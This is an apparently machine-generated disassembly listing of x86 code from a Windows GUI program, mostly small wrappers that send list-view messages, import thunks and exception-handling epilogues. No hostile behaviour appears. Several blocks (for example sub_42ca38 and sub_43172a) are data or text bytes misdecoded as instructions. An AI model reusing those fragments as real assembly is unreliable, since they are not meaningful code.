ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_42a914
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1001
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a948
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_42a958
shl eax 0xc
retn
sub_42a95c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a974
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a98c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a9a4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1008
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a9bc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageA
pop ebx
retn
sub_42a9f4
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_42aa40
push edx
push 0x0
push 0x1012
push eax
call SendMessageA
retn
sub_42aa6c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1016
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42aa84
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageA
pop ebx
retn
sub_42aab4
push ecx
push edx
push 0x101b
push eax
call SendMessageA
retn
sub_42aac4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42aadc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ab34
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1024
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ab4c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1026
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ab64
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageA
retn
sub_42ab74
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42abdc
push ecx
push edx
push 0x102c
push eax
call SendMessageA
retn
sub_42ac68
push 0x0
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42ac78
push ecx
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42aca4
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageA
retn
sub_42acb4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1036
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ad20
push edx
push 0x0
push 0x1047
push eax
call SendMessageA
retn
sub_42ad30
push 0x0
push 0x0
push 0x1048
push eax
call SendMessageA
retn
sub_42ad40
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ad58
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ad70
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_42ad80
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_42ade4
push 0x0
push 0x0
push 0x1008
push eax
call SendMessageA
retn
sub_42ae19
jmp sub_403a98
sub_42ae20
pop ebp
retn
sub_42ae24
sub [ rw-data ] 0x1
retn
sub_42aeeb
jmp sub_403a98
sub_42aef2
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b508
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42af14
mov [ rw-data ] sub_42b02c
mov [ rw-data ] sub_42af9c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42b230
mov [ rw-data ] sub_42b304
mov [ rw-data ] sub_42b3d8
retn
sub_42b599
jmp sub_403a98
sub_42b5a0
pop ebp
retn
sub_42b5a4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b508
sub_42b5d9
jmp sub_403a98
sub_42b5e0
pop ebp
retn
sub_42b5e4
sub [ rw-data ] 0x1
retn
sub_42b873
add eax 0xffffffd4
jmp sub_42c3a0
sub_42b87b
add eax 0xffffffd4
jmp sub_42c3fc
sub_42b88d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405b8c
sub_42b897
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ba0
sub_42ba26
jmp sub_403a98
sub_42ba2d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bc3d
jmp sub_403a98
sub_42bc44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bdf9
jmp sub_403a98
sub_42be5e
jmp sub_403a98
sub_42be65
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bf51
jmp sub_403a98
sub_42bf58
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c168
lea eax [ ebp - 0x30 ]
call sub_404118
lea eax [ ebp - 0x20 ]
call sub_404118
retn
sub_42c179
jmp sub_403a98
j_sub_42c168
jmp sub_42c168
sub_42c180
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c27b
jmp sub_403a98
sub_42c282
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c37f
jmp sub_403a98
sub_42c386
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c3e6
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
sub_42c3ef
jmp sub_403a98
j_sub_42c3e6
jmp sub_42c3e6
sub_42c3f6
pop ebx
pop ecx
pop ebp
retn
sub_42c491
jmp sub_403a98
sub_42c498
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42c4a4
mov eax [ eax + 0x20 ]
retn
sub_42c5d3
jmp sub_403a98
sub_42c5da
pop ebp
retn
sub_42c5dc
sub [ rw-data ] 0x1
retn
sub_42c609
jmp sub_403a98
sub_42c610
pop ebp
retn
sub_42c614
sub [ rw-data ] 0x1
retn
sub_42c64d
jmp sub_403a98
sub_42c654
pop ebp
retn
sub_42c658
sub [ rw-data ] 0x1
retn
sub_42c965
jmp sub_403a98
sub_42c96c
pop ebp
retn
sub_42c970
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c6bc
sub_42ca38
adc [ ebx + eax * 2 + 0x72 ] dl
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42ca50
retn
sub_42cac4
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42cad0
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42cadc
mov edx [ eax ]
call [ edx ]
retn
sub_42cae4
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42cb11
jmp sub_403a98
sub_42cb18
pop ebp
retn
sub_42cb1c
sub [ rw-data ] 0x1
retn
sub_42ccdb
jmp sub_403a98
sub_42cce2
pop ebp
retn
sub_42d097
jmp sub_403a98
sub_42d09e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42d4b8
jmp sub_403a98
sub_42d4bf
pop ebp
retn
sub_42d4c4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ca54
mov [ rw-data ] eax
sub_42d505
jmp sub_403a98
sub_42d50c
pop ebp
retn
sub_42d510
sub [ rw-data ] 0x1
retn
sub_42d53d
jmp sub_403a98
sub_42d544
pop ebp
retn
sub_42d548
sub [ rw-data ] 0x1
retn
sub_42d575
jmp sub_403a98
sub_42d57c
pop ebp
retn
sub_42d580
sub [ rw-data ] 0x1
retn
sub_42d5ad
jmp sub_403a98
sub_42d5b4
pop ebp
retn
sub_42d5b8
sub [ rw-data ] 0x1
retn
sub_42d5e5
jmp sub_403a98
sub_42d5ec
pop ebp
retn
sub_42d5f0
sub [ rw-data ] 0x1
retn
sub_42d61d
jmp sub_403a98
sub_42d624
pop ebp
retn
sub_42d628
sub [ rw-data ] 0x1
retn
sub_42d689
jmp sub_403a98
sub_42d690
pop ebp
retn
sub_42d694
sub [ rw-data ] 0x1
retn
sub_42d6c1
jmp sub_403a98
sub_42d6c8
pop ebp
retn
sub_42d6cc
sub [ rw-data ] 0x1
retn
sub_42d6f9
jmp sub_403a98
sub_42d700
pop ebp
retn
sub_42d704
sub [ rw-data ] 0x1
retn
sub_42d710
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42d97e
jmp sub_4037e4
sub_42d983
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d9a0
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d9a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403518
pop esi
retn
sub_42d9c0
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403518
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42d9d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42da81
jmp sub_403a98
sub_42daaf
jmp sub_403a98
sub_42dab6
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dac0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42dad4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42dd32
jmp sub_403a98
sub_42dd39
pop ebp
retn
sub_42f8b2
jmp sub_4037e4
sub_42f96b
jmp sub_403a98
sub_42f972
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f978
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42f8ec
sub_42f988
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42f8ec
sub_42f998
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42f8ec
pop ebp
retn 0x8
sub_42f9b0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42fadc
push ebx
mov ebx eax
mov eax ebx
call sub_45468c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42faf0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42fb24
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42fc28
jmp sub_403a98
sub_42fc2f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fdd2
jmp sub_403a98
sub_42fdd9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42fde3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42fdf8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_451974
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fe14
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_451974
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fe30
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_451974
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fe4c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_451974
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fe68
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_452654
sub_42fe7c
mov al [ eax + 0x220 ]
retn
sub_42ffe5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42fffd
jmp sub_403a98
sub_430309
jmp sub_4037e4
sub_43047c
retn
sub_430609
jmp sub_403a98
sub_43068c
push ebx
mov ebx eax
mov eax ebx
call sub_450988
mov eax ebx
call sub_430480
pop ebx
retn
sub_4306a0
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_4510a8
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_4307c8
pop ebx
retn
sub_4307b8
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_430891
jmp sub_403a98
sub_430898
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4308e0
push ebx
mov ebx eax
mov eax ebx
call sub_454610
mov eax ebx
call sub_430480
pop ebx
retn
sub_4308f4
push ebx
mov ebx eax
mov eax ebx
call sub_443e94
mov eax ebx
call sub_430480
pop ebx
retn
sub_430908
mov al 0x1
retn
sub_43090c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_430c44
jmp sub_403a98
sub_430c4b
pop ebp
retn
sub_430c50
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e1c
mov eax [ r-xdata ]
call sub_41832c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
sub_430ced
jmp sub_403a98
sub_430cf4
pop ebp
retn
sub_430cf8
sub [ rw-data ] 0x1
retn
sub_430d31
jmp sub_403a98
sub_430d38
pop ebp
retn
sub_430d3c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_430db8
retn
sub_430db9
jmp sub_403a98
j_sub_430db8
jmp sub_430db8
sub_430dc0
pop ebp
retn
sub_430dc4
sub [ rw-data ] 0x1
retn
sub_430dcc
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_40331c
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_430e90
jmp sub_403a98
sub_430e9c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_430de8
call sub_403e68
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402d00
sub_430ee9
jmp sub_403a98
sub_430ef0
pop ebp
retn
sub_430ef4
sub [ rw-data ] 0x1
retn
sub_430f50
jmp sub_403a98
sub_430f57
pop ebp
retn
sub_430f5c
sub [ rw-data ] 0x1
retn
sub_430fb8
jmp sub_403a98
sub_430fbf
pop ebp
retn
sub_430fc4
sub [ rw-data ] 0x1
retn
sub_431025
jmp sub_403a98
sub_43102c
pop ebp
retn
sub_431030
sub [ rw-data ] 0x1
retn
sub_43107c
jmp sub_403a98
sub_431083
pop ebp
retn
sub_431088
sub [ rw-data ] 0x1
retn
sub_43172a
mov bl 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp eax
sub_431b31
mov bl 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp eax
sub_431e1f
jmp sub_403a98
sub_431e2c
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_431ea4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_40416c
mov eax ebx
call sub_431e2c
pop esi
pop ebx
retn
sub_431ec0
mov [ eax + 0x14 ] edx
call sub_431e2c
retn
sub_431ecc
mov [ eax + 0x18 ] edx
call sub_431e2c
retn
sub_431f04
push ebx
mov ebx eax
mov eax ebx
call sub_4198c8
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_432084
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_431ed8
call sub_431f14
sub_43209c
mov edx sub_431ed8
call sub_431f14
retn
sub_432261
jmp sub_403a98
sub_43229c
push ebx
mov ebx ecx
mov eax ebx
call sub_404118
pop ebx
retn
sub_4322a8
mov al 0x1
retn
sub_4323ad
jmp sub_403a98
sub_4324a8
retn
sub_4325cb
jmp sub_403a98
sub_4325d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43291c
mov eax [ eax + 0xd0 ]
call sub_419a38
retn
sub_43298c
mov eax [ r-xdata ]
retn
sub_4329b8
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4329ec
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_432adc
retn
sub_432c23
jmp sub_403a98
sub_432c2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c34
retn
sub_432c57
jmp sub_403a98
sub_432c5e
pop ebp
retn 0x4
sub_432cc1
jmp sub_403a98
sub_432cc8
pop ebp
retn
sub_432ccc
sub [ rw-data ] 0x1
retn
sub_434409
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub_436523
add ah dh
jmp sub_43656a
sub_436920
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c5dc
mov [ rw-data ] eax
sub_4369a0
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_4369b4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_436c4a
jmp sub_403a98
sub_436d82
jmp sub_403a98
sub_436d89
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436de4
mov al [ eax + 0xd ]
xor al 0x1
retn
sub_436e84
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_436c60
sub_436e94
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_4196b4
sub_436ea4
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_4196b4
sub_436fa8
mov eax [ eax + 0x18 ]
retn
sub_4370bb
jmp sub_403a98
sub_437110
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_40416c
pop esi
pop ebx
retn
sub_43721e
jmp sub_403a98
sub_437225
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437420
push ebx
mov ebx eax
mov eax ebx
call sub_41afa4
mov eax [ ebx + 0x34 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_437458
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_437ce4
retn
sub_437530
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_437dec
retn
sub_43753c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_418cf8
pop esi
pop ebx
retn
sub_437550
mov eax [ eax + 0x34 ]
call sub_418e44
retn
sub_437620
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_437618
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_40331c
sub_4376e8
push ebx
mov ebx eax
mov eax ebx
call sub_437b38
push eax
mov eax ebx
call sub_437644
pop edx
call sub_42ab8c
pop ebx
retn
sub_437b24
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_437b38
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_437d70
retn
mov eax [ eax + 0x18 ]
retn
sub_437b84
mov eax [ eax + 0x8 ]
call sub_43753c
retn
sub_437c64
or ecx 0xffffffff
xor edx edx
call sub_437c70
retn
sub_437d98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_437ce4
mov ecx 0x1
mov edx esi
call sub_42ac78
pop esi
pop ebx
retn
sub_437db4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_437ce4
call sub_42a9bc
sub_437dd4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_437dec
sub_437f6d
jmp sub_403a98
sub_437fb0
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_437dec
sub_4382c8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_40270c
retn
sub_4382d4
jmp sub_403a98
j_sub_4382c8
jmp sub_4382c8
sub_4382db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4382fd
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40413c
retn
sub_4382f6
jmp sub_403a98
sub_4382fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43858b
jmp sub_403a98
sub_438592
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385b4
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_40413c
retn
sub_4385ad
jmp sub_403a98
sub_4385b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4385bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437cf0
call sub_437620
pop esi
pop ebx
retn
sub_4385d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_43866c
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_452654
sub_438680
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_452654
sub_438694
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_452654
sub_438bb0
jmp sub_403a98
sub_438d06
jmp sub_403a98
sub_43905d
jmp sub_403a98
sub_439064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439087
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405400
retn
sub_439080
jmp sub_403a98
sub_439087
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439165
jmp sub_4037e4
sub_43916a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439265
jmp sub_4037e4
sub_43926a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439530
cmp dl [ eax + 0x277 ]
je r-xdata
retn
mov [ eax + 0x277 ] dl
call sub_4392a4
sub_439544
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
call sub_4392a4
sub_4395ac
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
call sub_452654
sub_4395c0
cmp dl [ eax + 0x27a ]
je r-xdata
retn
mov [ eax + 0x27a ] dl
call sub_4392a4
sub_4395d4
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_4392a4
sub_4395e8
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_4392a4
sub_4395fc
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_452654
sub_439610
cmp dl [ eax + 0x22a ]
je r-xdata
retn
mov [ eax + 0x22a ] dl
call sub_452654
sub_43966c
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_452654
sub_439680
cmp dl [ eax + 0x22b ]
je r-xdata
retn
mov [ eax + 0x22b ] dl
call sub_452654
sub_439694
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax ebx
call sub_4550b4
pop edx
call sub_42ab34
pop ebx
retn
sub_43995f
jmp sub_403a98
sub_439966
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439984
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_439990
cmp [ eax + 0x264 ] 0x0
setne al
retn
sub_4399dc
cmp dl [ eax + 0x238 ]
je r-xdata
retn
mov [ eax + 0x238 ] dl
call sub_452654
sub_4399f0
cmp dl [ eax + 0x216 ]
je r-xdata
retn
mov [ eax + 0x216 ] dl
call sub_452654
sub_439c38
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437bfc
retn
sub_439db5
jmp sub_403a98
sub_439dbc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439dc8
push ebx
mov ebx eax
mov eax ebx
call sub_4550b4
call sub_42aca4
pop ebx
retn
sub_43a0b9
jmp sub_403a98
sub_43a463
jmp sub_403a98
sub_43a629
jmp sub_403a98
sub_43aafe
jmp sub_403a98
sub_43ab05
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ab80
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_43abd0
push ebx
cmp [ eax + 0x362 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_43ac49
jmp sub_403a98
sub_43ac50
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43adad
jmp sub_403a98
sub_43adb4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b114
mov eax [ eax + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43b120
push esi
mov esi eax
mov eax [ esi + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43b38c
mov eax [ eax + 0x23c ]
call sub_436f90
retn
sub_43b418
push ebx
cmp [ eax + 0x34a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34c ]
call [ ebx + 0x348 ]
sub_43ba53
jmp sub_403a98
sub_43ba70
jmp sub_403a98
sub_43ba77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bbcd
jmp sub_403a98
sub_43bbd4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bbe4
mov [ eax + 0x28a ] 0x1
retn
sub_43c047
jmp sub_403a98
sub_43c04e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c080
mov [ eax + 0x294 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43c1a5
jmp sub_403a98
sub_43c1ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c1b4
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
sub_43c1f8
push ebx
mov ebx eax
mov eax ebx
call sub_4550b4
call sub_42ad30
pop ebx
retn
sub_43c485
jmp sub_403a98
sub_43c48c
pop esi
